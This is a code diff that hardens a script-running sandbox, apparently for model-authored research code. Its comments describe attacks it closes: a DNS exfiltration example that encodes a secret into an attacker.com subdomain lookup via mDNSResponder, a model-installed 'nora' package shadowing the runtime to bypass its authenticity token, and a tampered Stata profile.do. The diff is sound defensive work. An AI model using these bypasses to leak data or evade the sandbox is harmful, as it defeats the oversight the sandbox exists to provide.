@@ -943,6 +943,15 @@ def run_script(
 
 def _make_run_dir(cwd: Path) -> Path:
     """Create a fresh per-run directory under <cwd>/.nora/runs/."""
+    # Ensure .nora exists at mode 0o700 BEFORE creating the per-run
+    # subtree. ``p.mkdir(parents=True, ...)`` would silently create
+    # ``.nora`` with the default umask (0o755 on most systems), leaving
+    # the raw subprocess logs (stdout.log / stderr.log), the pre-SDC
+    # result.json, and the researcher-authored script file all
+    # world-readable on shared filesystems. Gating .nora gates every
+    # descendant via the no-execute-on-parent rule.
+    from nora.config import ensure_private_nora_dir
+    ensure_private_nora_dir(cwd)
     timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
     run_id = uuid.uuid4().hex[:8]
     p = cwd / RUNS_SUBDIR / f"{timestamp}_{run_id}"
@@ -1029,19 +1038,33 @@ def _write_script(run_dir: Path, language: Language, code: str) -> Path:
         # writes get filtered by ``-I`` and the sandbox; ``--target
         # <nora_python_pkg_dir>`` is the path both surfaces share.
         # See ``package_installer.nora_python_pkg_dir``.
+        #
+        # ORDER matters here: ``lib_dir`` MUST end up before
+        # ``pkg_dir`` on ``sys.path`` so the staged Nora runtime
+        # always wins over any installed package of the same name.
+        # If pkg_dir came first, a model-authored
+        # ``install_packages(["nora"])`` call (or any package whose
+        # wheel ships a top-level ``nora`` module) would shadow the
+        # staged ``nora.py``, bypassing the ``NORA_RUN_TOKEN`` pop
+        # and the authenticity-token machinery the runtime owns.
+        # And we ``append`` pkg_dir (rather than ``insert(0, ...)``)
+        # so it sits after stdlib — an installed package can't
+        # shadow ``os`` / ``json`` / etc.
         from nora.package_installer import nora_python_pkg_dir
         from nora.env_detect import find_python
         lib_dir = run_dir / "lib"
         py_tool = find_python()
         preamble_lines = [
             "import sys as _nora_sys",
-            f"_nora_sys.path.insert(0, {str(lib_dir)!r})",
         ]
         if py_tool is not None:
             pkg_dir = nora_python_pkg_dir(py_tool.binary)
             preamble_lines.append(
-                f"_nora_sys.path.insert(0, {str(pkg_dir)!r})"
+                f"_nora_sys.path.append({str(pkg_dir)!r})"
             )
+        preamble_lines.append(
+            f"_nora_sys.path.insert(0, {str(lib_dir)!r})"
+        )
         preamble_lines.append("del _nora_sys")
         preamble_lines.append(
             "# ----- Nora preamble above; researcher code below -----"
@@ -1054,7 +1077,24 @@ def _write_script(run_dir: Path, language: Language, code: str) -> Path:
     # Quoted paths in Stata's `adopath +` and `cd` handle spaces fine
     # at the language level — only the command-line `-b do <path>`
     # has the tokenization bug (see _stata_command).
+    #
+    # ``capture program drop _all`` is load-bearing: Stata batch mode
+    # runs ``~/ado/profile.do`` at startup BEFORE the user's do file,
+    # so any program defined there (``program define nora_result_regress
+    # ...malicious...``) ends up in memory ahead of the preamble.
+    # Stata's program resolver checks in-memory programs before the
+    # adopath, so a tampered profile.do would shadow the staged
+    # ``nora_result_regress.ado`` (and any other helper) even though
+    # the adopath ``+ NORA_LIB_DIR`` runs first in *this* preamble.
+    # Dropping all user-written programs here forces ``nora_result_*``
+    # / ``nora_plot_*`` calls in the researcher's code to resolve via
+    # adopath, which hits Nora's lib_dir first. ``_all`` does NOT
+    # touch built-in commands like ``regress`` / ``summarize``, so a
+    # researcher relying on Stata's own programs sees no behavior
+    # change. ``capture`` suppresses the error on the (uncommon)
+    # case where no user programs are loaded.
     preamble = (
+        "capture program drop _all\n"
         "local lib : env NORA_LIB_DIR\n"
         "adopath + \"`lib'\"\n"
         "local nora_cwd : env NORA_CWD\n"
@@ -1387,6 +1427,36 @@ def _build_profile(
         "(allow sysctl*)\n"
         "(allow ipc-posix*)\n"
         "(allow signal)\n"
+        "\n"
+        "; Close the Mach-IPC bridge to system daemons that perform\n"
+        "; network I/O on the caller's behalf. ``(deny network*)``\n"
+        "; alone is insufficient: macOS's ``getaddrinfo()`` /\n"
+        "; ``res_query()`` route DNS lookups through mDNSResponder,\n"
+        "; which runs OUTSIDE this sandbox and issues the actual UDP\n"
+        "; packets. A script that does\n"
+        ";   getaddrinfo(\"<base32-encoded-secret>.attacker.com\")\n"
+        "; never touches the network from its own process — the\n"
+        "; ``(deny network*)`` rule above doesn't fire — but the\n"
+        "; encoded subdomain still reaches the attacker's nameserver.\n"
+        ";\n"
+        "; SBPL evaluates rules in declaration order with last-match-\n"
+        "; wins, so these denies override the (allow mach*) above for\n"
+        "; the specific global-names. R and Stata don't need to talk\n"
+        "; to these daemons at script-time; ``install_packages`` runs\n"
+        "; outside the sandbox where it has full network and mach\n"
+        "; access. The list isn't claimed to be exhaustive — other\n"
+        "; system services may also bridge to the network — but it\n"
+        "; closes the canonical mDNSResponder bypass.\n"
+        "(deny mach-lookup\n"
+        "    (global-name \"com.apple.mDNSResponder\")\n"
+        "    (global-name \"com.apple.mDNSResponderHelper\")\n"
+        "    (global-name \"com.apple.dnsextensiond\")\n"
+        "    (global-name \"com.apple.networkserviceproxy\")\n"
+        "    (global-name \"com.apple.nehelper\")\n"
+        "    (global-name \"com.apple.nesessionmanager\")\n"
+        "    (global-name \"com.apple.network.statistics\")\n"
+        "    (global-name \"com.apple.SystemConfiguration.PPPController\")\n"
+        "    (global-name \"com.apple.SystemConfiguration.SCNetworkReachability\"))\n"
         "\n"
         "; stat() is allowed anywhere — only reading file *contents* is\n"
         "; restricted below. R/Stata probe many paths during startup.\n"
